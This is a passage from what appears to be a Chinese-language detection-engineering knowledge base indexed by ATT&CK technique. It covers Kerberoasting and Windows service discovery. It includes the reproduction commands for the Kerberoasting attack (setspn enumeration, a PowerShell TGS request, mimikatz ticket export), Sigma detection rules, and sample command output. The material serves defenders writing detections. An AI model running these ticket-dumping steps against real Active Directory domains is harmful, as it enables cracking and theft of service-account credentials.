<p>https://adsecurity.org/?p=2288</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","title":"T1558-003-windows-\u57fa\u4e8eSPN\u51ed\u8bc1\u83b7\u53d6","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528\u6709\u6548\u7684Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u6216\u55c5\u63a2\u7f51\u7edc\u6d41\u91cf\u4ee5\u83b7\u5f97\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u86ee\u529b\u653b\u51fb\u7684\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u7968\u8bc1\u3002</p> <p>\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7528\u4e8e\u552f\u4e00\u6807\u8bc6Windows\u670d\u52a1\u7684\u6bcf\u4e2a\u5b9e\u4f8b\u3002\u4e3a\u4e86\u542f\u7528\u8eab\u4efd\u9a8c\u8bc1\uff0cKerberos\u8981\u6c42SPN\u4e0e\u81f3\u5c11\u4e00\u4e2a\u670d\u52a1\u767b\u5f55\u5e10\u6237\uff08\u4e13\u95e8\u8d1f\u8d23\u8fd0\u884c\u670d\u52a1[3]\u7684\u5e10\u6237\uff09\u76f8\u5173\u8054\u3002</p> <p>\u62e5\u6709\u6709\u6548\u7684Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u57df\u63a7\u5236\u5668\uff08DC\uff09\u8bf7\u6c42\u4efb\u4f55SPN\u7684\u4e00\u4e2a\u6216\u591a\u4e2aKerberos\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u670d\u52a1\u7968\u8bc1\u3002\u4ee5\u4f7f\u7528RC4\u7b97\u6cd5\u5bf9\u8fd9\u4e9b\u7968\u8bc1\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u52a0\u5bc6\uff0c\u8fd9\u610f\u5473\u7740\u4e0eSPN\u76f8\u5173\u8054\u7684\u670d\u52a1\u5e10\u6237\u7684Kerberos 5 TGS\u200b\u200b-REP etype 23\u54c8\u5e0c\u5c06\u7528\u4f5c\u79c1\u94a5\uff0c\u56e0\u6b64\u5bb9\u6613\u53d7\u5230\u79bb\u7ebf\u86ee\u529b\u653b\u51fb\u53ef\u80fd\u66b4\u9732\u660e\u6587\u51ed\u636e\u7684\u653b\u51fb\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528\u4ece\u7f51\u7edc\u6d41\u91cf\u4e2d\u6355\u83b7\u7684\u670d\u52a1\u7968\u8bc1\u6267\u884c\u76f8\u540c\u7684\u653b\u51fb\u3002</p> <p>\u6563\u5217\u7684\u7834\u89e3\u53ef\u80fd\u4f1a\u901a\u8fc7\u8bbf\u95ee\u6709\u6548\u5e10\u6237\u6765\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#spnservice-principal-name","title":"SPN(Service Principal Name)\u670d\u52a1\u4e3b\u4f53\u540d","text":"<p>\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7528\u4e8e\u552f\u4e00\u6807\u8bc6Windows\u670d\u52a1\u7684\u6bcf\u4e2a\u5b9e\u4f8b\u3002\u8981\u542f\u7528\u8eab\u4efd\u9a8c\u8bc1\uff0cKerberos\u8981\u6c42SPN\u4e0e\u81f3\u5c11\u4e00\u4e2a\u670d\u52a1\u767b\u5f55\u5e10\u6237\uff08\u4e13\u95e8\u8d1f\u8d23\u8fd0\u884c\u670d\u52a1\u7684\u5e10\u6237\uff09\u76f8\u5173\u8054\u3002</p> <p>\u62e5\u6709\u6709\u6548Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u57df\u63a7\u5236\u5668\uff08DC\uff09\u8bf7\u6c42\u4efb\u4f55SPN\u7684\u4e00\u4e2a\u6216\u591a\u4e2aKerberos\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u670d\u52a1\u7968\u8bc1\u3002\u8fd9\u4e9b\u7968\u8bc1\u7684\u4e00\u90e8\u5206\u53ef\u4ee5\u4f7f\u7528RC4\u7b97\u6cd5\u52a0\u5bc6\uff0c\u8fd9\u610f\u5473\u7740\u4e0eSPN\u5173\u8054\u7684\u670d\u52a1\u5e10\u6237\u7684Kerberos 5 TGS-REP etype 23\u54c8\u5e0c\u88ab\u7528\u4f5c\u79c1\u94a5\uff0c\u56e0\u6b64\u5bb9\u6613\u53d7\u5230\u79bb\u7ebf\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u660e\u6587\u51ed\u636e\u6cc4\u9732\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528\u4ece\u7f51\u7edc\u6d41\u91cf\u6355\u83b7\u7684\u670d\u52a1\u7968\u636e\u6765\u6267\u884c\u76f8\u540c\u7684\u653b\u51fb\u3002</p> <p>\u5148\u6765\u4ecb\u7ecd\u4e00\u4e0bSpnEndpointIdentity\u548cUpnEndpointIdentity\u3002\u8fd9\u4e24\u4e2aEndpointIdentity\u662fWindows\u8ba4\u8bc1\u4e0b\u670d\u52a1\u8eab\u4efd\u7684\u4e24\u79cd\u8868\u73b0\u5f62\u5f0f\u3002\u524d\u8005\u88ab\u79f0\u4e3a\u670d\u52a1\u4e3b\u4f53\u540d\uff08SPN\uff1aService Principal Name\uff0c\u4ee5\u4e0b\u7b80\u79f0SPN\uff09\uff0c\u53e6\u4e00\u79cd\u88ab\u79f0\u4e3a\u7528\u6237\u4e3b\u4f53\u540d\uff08UPN\uff1aUser Principal Name\uff0c\u4ee5\u4e0b\u7b80\u79f0UPN\uff09\u3002</p> <p>\u5982\u679c\u4f60\u5bf9Kerberos\u6709\u4e00\u5b9a\u7684\u4e86\u89e3\uff0c\u76f8\u4fe1\u4e00\u5b9a\u5bf9SPN\u4e0d\u4f1a\u611f\u5230\u964c\u751f\u3002\u5bf9\u4e8e\u4e00\u4e2a\u8fd0\u884c\u5728\u57df\u73af\u5883\u4e2d\u67d0\u53f0\u673a\u5668\u4e0a\u7684\u670d\u52a1\uff0c\u5b83\u80fd\u88ab\u8bbf\u95ee\u5b83\u7684\u5ba2\u6237\u7aef\u8ba4\u8bc1\u7684\u5148\u51b3\u6761\u4ef6\u662f\uff1a\u5ba2\u6237\u7aef\u80fd\u591f\u552f\u4e00\u6807\u8bc6\u8be5\u670d\u52a1\uff0c\u800cSPN\u5c31\u53ef\u4ee5\u770b\u4f5c\u662f\u8fd9\u4e2a\u6807\u8bc6\u7b26\u3002\u5728\u9ed8\u8ba4\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u670d\u52a1\u5bc4\u5bbf\u8fdb\u7a0b\u5728\u673a\u5668\u5e10\u53f7\uff08\u6216\u8005\u7cfb\u7edf\u5e10\u53f7\uff0c\u6bd4\u5982LocalService, LocalSystem, or NetworkService\u7b49\uff09\u4e0b\uff0c\u670d\u52a1\u8eab\u4efd\u901a\u8fc7SPN\u8868\u793a\uff1b\u5982\u679c\u6267\u884c\u670d\u52a1\u5bc4\u5bbf\u8fdb\u7a0b\u7684\u662f\u4e00\u4e2a\u57df\u7528\u6237\u5e10\u6237\uff0c\u5219\u91c7\u7528UPN\u8868\u793a\u670d\u52a1\u8eab\u4efd\u3002WCF\u4e2d\u7684SPN\u548cUPN\u7684\u683c\u5f0f\u5982\u4e0b\u3002\u5982\u679c\u5ba2\u6237\u7aef\u9884\u5148\u6307\u5b9aSPN/UPN\u8868\u793a\u670d\u52a1\u8eab\u4efd\uff0c\u5b83\u901a\u8fc7\u6267\u884c\u670d\u52a1\u5bc4\u5bbf\u8fdb\u7a0b\u5e10\u53f7\u5bf9\u5e94\u7684Windows\u51ed\u8bc1\u548cSPN/UPN\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u672a\u786e\u5b9a\u670d\u52a1\u8fd0\u884c\u5728\u9884\u5148\u8bbe\u5b9a\u7684\u673a\u5668\u6216\u8005\u67d0\u4e2a\u57df\u7528\u6237\u5e10\u53f7\u4e0b\u3002</p> <p>\u8be6\u7ec6\u4ecb\u7ecd\u4f60\u53ef\u4ee5\u53c2\u8003WCF\u5b89\u5168\u7cfb\u5217\uff1ahttps://www.cnblogs.com/artech/archive/2011/06/12/Authentication_043.html</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#spn","title":"SPN\u653b\u51fb\u539f\u7406","text":"<p>Active Directory\u73af\u5883\u4e2d\u53d1\u73b0\u670d\u52a1\u7684\u6700\u4f73\u65b9\u5f0f\u662f\u901a\u8fc7SPN\u626b\u63cf</p> <p>\u653b\u51fb\u8005\u901a\u8fc7SPN\u626b\u63cf\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u4e0d\u9700\u8981\u8fde\u63a5\u5230\u7f51\u7edc\u4e0a\u7684\u6bcf\u4e2aIP\u4ee5\u68c0\u67e5\u670d\u52a1\u7aef\u53e3\u3002SPN\u626b\u63cf\u901a\u8fc7LDAP\u67e5\u8be2\u57df\u63a7\u5236\u5668\u4ee5\u4fbf\u53d1\u73b0\u670d\u52a1\u3002\u7531\u4e8eSPN\u67e5\u8be2\u662f\u6b63\u5e38Kerberos\u7968\u8bc1\u6267\u884c\u7684\u4e00\u90e8\u5206\uff0c\u6240\u4ee5\u5f88\u96be\u88ab\u5b89\u5168\u8bbe\u5907\u63a2\u6d4b\u5230\uff0c\u800cnetwork\u7aef\u53e3\u626b\u63cf\u662f\u76f8\u5f53\u660e\u663e\u7684\uff0c\u5bb9\u6613\u88ab\u53d1\u73b0\u3002</p> <p>\u5373\u4f7f\u60a8\u4e0d\u5b8c\u5168\u4e86\u89e3Kerberos\u7684\u5185\u90e8\u5de5\u4f5c\u539f\u7406\uff0c\u653b\u51fb\u8fc7\u7a0b\u4e5f\u53ef\u5f52\u7eb3\u4e3a\uff1a</p> <ol> <li>\u626b\u63cfActive Directory\u4ee5\u8bbe\u7f6eSPN\u503c\u7684\u7528\u6237\u5e10\u6237\u3002</li> <li>\u4f7f\u7528SPN\u503c\u4eceAD\u8bf7\u6c42\u670d\u52a1\u7968\u8bc1</li> <li>\u5c06\u670d\u52a1\u7968\u636e\u63d0\u53d6\u5230\u5185\u5b58\u5e76\u4fdd\u5b58\u5230\u6587\u4ef6</li> <li>\u66b4\u529b\u7834\u89e3\u653b\u51fb\u8fd9\u4e9b\u5bc6\u7801\u76f4\u5230\u7834\u89e3</li> </ol> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff1a</p> <ol> <li>\u5229\u7528SPN\u626b\u63cf\u63a2\u6d4b\u542b\u6709SQL\u670d\u52a1\u7684\u4e3b\u673a\u670d\u52a1\uff1b</li> <li>\u8bc6\u522b\u76ee\u6807\u540e\uff0c\u5229\u7528piwehsell\u811a\u672c\u8bf7\u6c42\u6b64\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7684\u670d\u52a1\u7968\u636e\uff1b\u8bf7\u6ce8\u610f\uff0c\u8bf7\u6c42\u7684\u670d\u52a1\u7968\u8bc1\u662f\u5177\u6709RC4\u52a0\u5bc6\u7c7b\u578b</li> <li>\u4e00\u65e6\u5ba2\u6237\u7aef\u63a5\u6536\u5230\u7968\u636e\u4ee5\u540e\uff0c\u53ef\u4ee5\u5229\u7528mimikatz\u6216\u5176\u4ed6\u5de5\u5177\u5728\u7528\u6237\u7684\u5185\u5b58\u4e2d\u5bfc\u51fa\u6240\u6709kerberos\u7968\u8bc1\uff1b\uff08\u4e0d\u6d89\u53ca\u6743\u9650\u63d0\u5347\uff09</li> <li>\u6700\u540e\uff0c\u5c06\u7968\u636e\u5bfc\u51fa\u540e\uff0c\u5c06\u7968\u636e\u6587\u4ef6\u62f7\u8d1d\u5230\u6b63\u5728\u8fd0\u884ckerberoast\u7684kali linux\u4e3b\u673a\uff08\u6216\u5176\u4ed6\u4e3b\u673a\uff09\u3002\u5229\u7528wordlist\u5bc6\u7801\u5b57\u5178\uff0c\u53ef\u4ee5\u8fdb\u884c\u7834\u89e3\u4e0e\u7968\u636e\u76f8\u5173\u7684\u670d\u52a1\u8d26\u6237\u5bc6\u7801\u3002</li> </ol> <p>\u6ce8\u610f\uff1a\u83b7\u5f97\u670d\u52a1\u7968\u636e\u4e0d\u9700\u8981\u63d0\u9ad8\u6743\u9650\uff0c\u4e5f\u4e0d\u4f1a\u5411\u76ee\u6807\u53d1\u9001\u4efb\u4f55\u6d41\u91cf\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p> <p>Netflow\u6d41\u91cf</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","title":"\u6d4b\u8bd5\u73af\u5883\u51c6\u5907","text":"<p>windows server 2012\u57df\u63a7 \u9700\u5b89\u88c5powershell AD\u6a21\u5757</p> <p>windows server 2016\u88ab\u63a7\u4e3b\u673a \u9700\u5b89\u88c5powershell AD\u6a21\u5757</p> <p>\u5177\u4f53\u53ef\u53c2\u8003\uff1ahttps://zhuanlan.zhihu.com/p/25942591</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","title":"\u6d4b\u8bd5\u8fc7\u7a0b","text":"<p>1.\u5b89\u88c5powershell AD\u6a21\u5757</p> <pre><code>PS &gt;Import-Module  ServerManager ; Add-WindowsFeature RSAT-AD-PowerShell\n</code></pre> <p>2.\u67e5\u8be2\u5f53\u524d\u57df\u5185SPN\u670d\u52a1</p> <pre><code>setspn.exe -q */*\n</code></pre> <p>3.\u8bf7\u6c42\u6307\u5b9a\u7684TGS</p> <pre><code>$SPNName = 'MSSQLSvc/DC1.test.com'\nAdd-Type -AssemblyNAme System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName\n</code></pre> <p>4.\u6267\u884c\u540e\u8f93\u5165klist\u67e5\u770b\u5185\u5b58\u4e2d\u7684\u7968\u636e\uff0c\u53ef\u627e\u5230\u83b7\u5f97\u7684TGS.</p> <p>5.\u4f7f\u7528mimikatz</p> <pre><code>kerberos::list /export\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd74769</p> <p>Netflow \u52a0\u5bc6\u65b9\u5f0f\u3001\u670d\u52a1\u540d\u79f0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: SPN\u670d\u52a1\u626b\u63cf\u871c\u7f50\u8d26\u6237\ndescription: 0day.org\u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nreferences: https://adsecurity.org/?p=3458\ntags: T1558-003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4769  #\u5df2\u8bf7\u6c42 Kerberos \u670d\u52a1\u7968\u8bc1\u3002\n        ServiceName: abcc #\u670d\u52a1\u4fe1\u606f&gt;\u670d\u52a1\u540d\u79f0\uff08\u871c\u7f50\u8d26\u6237\u7528\u6237\uff09\n        Clientaddress: ::ffff:* #\u7f51\u7edc\u4fe1\u606f&gt;\u5ba2\u6237\u7aef\u5730\u5740\n        Ticketoptions: 0x40810000 #\u9644\u52a0\u4fe1\u606f&gt;\u7968\u8bc1\u4fe1\u606f\n        Ticketencryptiontype: 0x17 #\u9644\u52a0\u4fe1\u606f&gt;\u7968\u8bc1\u52a0\u5bc6\u7c7b\u578b\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_8","title":"\u5efa\u8bae","text":"<p>\u6ce8\u610f\uff1a\u6b64\u89c4\u5219\u65e0\u6cd5\u76f4\u63a5\u5229\u7528\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u601d\u8def\u3002\u9700\u8981\u57df\u5185\u5185\u7f6e\u871c\u7f50\u8d26\u6237\u7528\u6237\uff0c\u5f53\u653b\u51fb\u8005\u5bf9\u871c\u7f50\u8d26\u6237\u53d1\u8d77\u626b\u63cf\u3001\u8bf7\u6c42TGS\u65f6\uff0c\u6b64\u89c4\u5219\u53ef\u88ab\u89e6\u53d1\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1558-003</p> <p>https://attack.mitre.org/techniques/T1558/003</p> <p>SPN\u626b\u63cfSQL\u670d\u52a1\u4e3b\u4f53\u811a\u672c</p> <p>https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers</p> <p>powershell\u63a2\u6d4b\u811a\u672c</p> <p>https://github.com/PyroTek3/PowerShell-AD-Recon</p> <p>Active Directory\u4e2d\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u6743\u9650\u7684\u653b\u51fb\u65b9\u6cd5</p> <p>https://www.cnblogs.com/backlion/p/7159296.html</p> <p>\u4f7f\u7528KERBEROASTING\u63d0\u53d6\u670d\u52a1\u5e10\u6237\u5bc6\u7801</p> <p>https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/</p> <p>Active Directory\u4e2d\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\u7684\u8bf4\u660e</p> <p>https://thebackroomtech.com/2018/08/21/explanation-of-service-principal-names-in-active-directory/</p> <p>\u68c0\u6d4bKerberoasting\u6d3b\u52a8</p> <p>https://adsecurity.org/?p=3458</p> <p>\u68c0\u6d4bKerberoasting\u6d3b\u52a8\u7b2c2\u90e8\u5206</p> <p>https://adsecurity.org/?p=3513</p> <p>Active Directory PowerShell\u6a21\u5757\u6536\u96c6AD\u4fe1\u606f</p> <p>https://www.cnblogs.com/backlion/p/9267100.html</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/","title":"T1558-003-win-kerberosing","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7528\u4e8e\u552f\u4e00\u6807\u8bc6Windows\u670d\u52a1\u7684\u6bcf\u4e2a\u5b9e\u4f8b\u3002\u4e3a\u4e86\u542f\u7528\u8eab\u4efd\u9a8c\u8bc1\uff0cKerberos\u8981\u6c42SPN\u4e0e\u81f3\u5c11\u4e00\u4e2a\u670d\u52a1\u767b\u5f55\u5e10\u6237\uff08\u4e13\u95e8\u7528\u4e8e\u8fd0\u884c\u670d\u52a1\u7684\u5e10\u6237\uff09\u76f8\u5173\u3002 \u62e5\u6709\u6709\u6548\u7684Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u57df\u63a7\u5236\u5668\uff08DC\uff09\u8bf7\u6c42\u4efb\u4f55SPN\u7684\u4e00\u4e2a\u6216\u591a\u4e2aKerberos\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u670d\u52a1\u7968\u8bc1\u3002\u53ef\u4ee5\u4f7f\u7528RC4\u7b97\u6cd5\u5bf9\u8fd9\u4e9b\u7968\u8bc1\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u52a0\u5bc6\uff0c\u8fd9\u610f\u5473\u7740\u4e0eSPN\u76f8\u5173\u8054\u7684\u670d\u52a1\u5e10\u6237\u7684Kerberos 5 TGS\u200b\u200b-REP etype 23\u54c8\u5e0c\u5c06\u7528\u4f5c\u79c1\u94a5\uff0c\u56e0\u6b64\u5bb9\u6613\u53d7\u5230\u79bb\u7ebf\u66b4\u529b\u7834\u89e3\u653b\u51fb\u53ef\u80fd\u66b4\u9732\u660e\u6587\u51ed\u636e\u7684\u653b\u51fb\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528\u4ece\u7f51\u7edc\u6d41\u91cf\u4e2d\u6355\u83b7\u7684\u670d\u52a1\u7968\u8bc1\u6267\u884c\u76f8\u540c\u7684\u653b\u51fb\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>PowerSploit Empire</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p> <p>netflow\u6d41\u91cf</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: kerberos \u5f31\u52a0\u5bc6\ndescription: \u57df\u73af\u5883\u6d4b\u8bd5\nreferences: https://adsecurity.org/?p=3458\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4769  #kerberos\u670d\u52a1\u7968\u8bc1\u8bf7\u6c42\n        TicketOptions: 0x40810000  #\u9644\u52a0\u4fe1\u606f&gt;\u7968\u8bc1\u9009\u9879\n        TicketEncryptiontype: 0x17 #\u9644\u52a0\u4fe1\u606f&gt;\u7968\u8bc1\u52a0\u5bc6\u7c7b\u578b\n    reduction:\n        - ServiceName: '$*' #\u670d\u52a1\u540d\u79f0&gt;\u670d\u52a1\u4fe1\u606f\n    condition: selection and not reduction\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-kerberosing/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1558-003</p> <p>https://attack.mitre.org/techniques/T1558/003</p> <p>\u68c0\u6d4bkerberosing\u6d3b\u52a8</p> <p>https://adsecurity.org/?p=3458</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/","title":"T1007-\u7cfb\u7edf\u670d\u52a1\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u6709\u5173\u6ce8\u518c\u670d\u52a1\u7684\u4fe1\u606f\u3002\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u7a0b\u5e8f\u83b7\u53d6\u6709\u5173\u670d\u52a1\u7684\u4fe1\u606f\u7684\u547d\u4ee4\u662f\u201csc\u201d\uff0c\u4f7f\u7528Tasklist\u7684\u201c tasklist /svc\u201d \u548c\u4f7f\u7528Net\u547d\u4ee4\u7684\u201cnet start\u201d \uff0c\u4f46\u662f\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u201c \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0\u201d\u4e2d\u7684\u4fe1\u606f\u6765\u51b3\u5b9a\u540e\u7eed\u884c\u52a8\u8be5\u5982\u4f55\u5f00\u5c55\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u6267\u884c\u7279\u5b9a\u64cd\u4f5c\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows\u4e0b\u6267\u884csc\u76f8\u5173\u547d\u4ee4\u3001tasklist /svc\u3001net start</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Windows\\system32&gt;sc query\n\nSERVICE_NAME: BFE\nDISPLAY_NAME: Base Filtering Engine\n        TYPE               : 20  WIN32_SHARE_PROCESS\n        STATE              : 4  RUNNING\n                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n</code></pre> <pre><code>C:\\Windows\\system32&gt;tasklist /svc\n\n\u6620\u50cf\u540d\u79f0                       PID \u670d\u52a1\n========================= ======== ============================================\nSystem Idle Process              0 \u6682\u7f3a\nSystem                           4 \u6682\u7f3a\nsmss.exe                       288 \u6682\u7f3a\ncsrss.exe                      420 \u6682\u7f3a\ncsrss.exe                      532 \u6682\u7f3a\nwininit.exe                    576 \u6682\u7f3a\nwinlogon.exe                   584 \u6682\u7f3a\nservices.exe                   664 \u6682\u7f3a\n</code></pre> <pre><code>C:\\Windows\\system32&gt;net start\n\u5df2\u7ecf\u542f\u52a8\u4ee5\u4e0b Windows \u670d\u52a1:\n\n   Background Tasks Infrastructure Service\n   Base Filtering Engine\n   CDPUserSvc_11e76e\n   Certificate Propagation\n   CNG Key Isolation\n   COM+ Event System\n   COM+ System 